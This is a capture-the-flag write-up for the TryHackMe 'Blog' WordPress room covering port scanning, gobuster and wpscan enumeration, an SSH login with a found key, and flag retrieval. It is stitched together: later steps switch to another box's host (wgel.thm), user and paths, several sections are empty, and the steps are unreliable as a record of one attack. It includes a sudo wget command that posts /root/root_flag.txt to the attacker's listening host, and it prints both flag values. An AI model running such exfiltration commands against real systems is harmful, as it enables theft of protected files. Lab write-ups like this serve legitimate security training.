# Copy of Blog

<figure><img src=".gitbook/assets/image (55).png" alt="" width="188"><figcaption><p><a href="https://tryhackme.com/room/colddboxeasy">https://tryhackme.com/room/colddboxeasy</a></p></figcaption></figure>

🔗 [ColdBox](https://tryhackme.com/room/colddboxeasy)

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

_In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file._

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.139.146`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.139.146 blog.thm" >> /etc/hosts

mkdir thm/blog.thm
cd thm/blog.thm
mkdir {nmap,content,exploits,scripts}

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 blog.thm
PING blog.thm (10.10.139.146) 56(84) bytes of data.
64 bytes from blog.thm (10.10.139.146): icmp_seq=1 ttl=63 time=64.3 ms
64 bytes from blog.thm (10.10.139.146): icmp_seq=2 ttl=63 time=67.2 ms
64 bytes from blog.thm (10.10.139.146): icmp_seq=3 ttl=63 time=88.0 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix, while Windows systems usually have a TTL of 128 secs.

Of course, start to check information scanning open ports:

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 wgel.thm -oG nmap/port_scan
```

```bash
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 4 open ports on the machine: 22,80,139,445.

Now, we need to search which services are running on open ports:

```bash
nmap -p22,80,139,445 -n -Pn -vvv -sCV --min-rate 5000 blog.thm -oN nmap/open_port
```

```bash
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3hfvTN6e0P9PLtkjW4dy+6vpFSh1PwKRZrML7ArPzhx1yVxBP7kxeIt3lX/qJWpxyhlsQwoLx8KDYdpOZlX5Br1PskO6H66P+AwPMYwooSq24qC/Gxg4NX9MsH/lzoKnrgLDUaAqGS5ugLw6biXITEVbxrjBNdvrT1uFR9sq+Yuc1JbkF8dxMF51tiQF35g0Nqo+UhjmJJg73S/VI9oQtYzd2GnQC8uQxE8Vf4lZpo6ZkvTDQ7om3t/cvsnNCgwX28/TRcJ53unRPmos13iwIcuvtfKlrP5qIY75YvU4U9nmy3+tjqfB1e5CESMxKjKesH0IJTRhEjAyxjQ1HUINP
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJtovk1nbfTPnc/1GUqCcdh8XLsFpDxKYJd96BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI=
|   256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICfVpt7khg8YIghnTYjU1VgqdsCRVz7f1Mi4o4Z45df8
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-generator: WordPress 5.0
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-p   syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2023-10-09T20:09:44+00:00
| nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BLOG<00>             Flags: <unique><active>
|   BLOG<03>             Flags: <unique><active>
|   BLOG<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2023-10-09T20:09:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 19082/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 18083/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 25508/udp): CLEAN (Failed to receive data)
|   Check 4 (port 20819/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

### Task 3 - Root.txt?

Then we can start to see website (port 80):

<figure><img src=".gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

and see page source for checking information disclosure.

<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

but we don't find precious info.

Another good thing to do, is find hidden paths on website using gobuster

```
gobuster dir -u blog.thm -w /usr/share/wordlists/dirb/common.txt
```

<figure><img src=".gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

Very good, we can start to check these web dir:

<div align="left">

<figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

</div>

we just know that wp-admin is a default login path for wordpress, then we go there:

<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

we can try to login with admin/billy/kare:password (that are present on blog page how authors), but it doesn't works.

We can launch wp-scan to give info from wordpress:

```bash
wpscan --url http://blog.thm -e u 
```

```bash
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:01:14 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:01:14

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)
```









```bash
gobuster dir -u wgel.thm/sitemap -w /usr/share/wordlists/dirb/common.txt  
```

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

we've find and id\_rsa:

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

remembering that we've user and id rsa, first take permission to id\_rsa file and try login:

```bash
chmod 600 id_rsa
ssh -i id_rsa jessie@wgel.thm
```

<div align="left">

<figure><img src=".gitbook/assets/Schermata del 2023-10-07 15-16-33.png" alt=""><figcaption></figcaption></figure>

</div>

We're in, try to find user.txt flag using find command:\


```bash
find / -type f -iname "*flag.txt" 2>/dev/null
```

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>🚩 Flag 1 (user_flag.txt)</summary>

057c67131c3d5e42dd5cd3075b198ff6

</details>

### Task 4 - user.txt?

We can do sudo -l command to discover user's permissions.











<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption><p>find IP and listen on port 4444</p></figcaption></figure>

```bash
sudo /usr/bin/wget http://10.9.80.228:4444 --post-file=/root/root_flag.txt
```

<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

<div align="left">

<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

</div>

Well done! Root flag found!

<details>

<summary>🚩 Flag 2 (root_flag.txt)</summary>

b1b968b37519ad1daa6408188649263d

</details>

### 4.1 Where was user.txt found?











{% hint style="info" %}

{% endhint %}

### 4.2 What CMS was Billy using?

\










{% hint style="info" %}

{% endhint %}

### 4.3 What version of the above CMS was being used?

\












{% hint style="info" %}

{% endhint %}
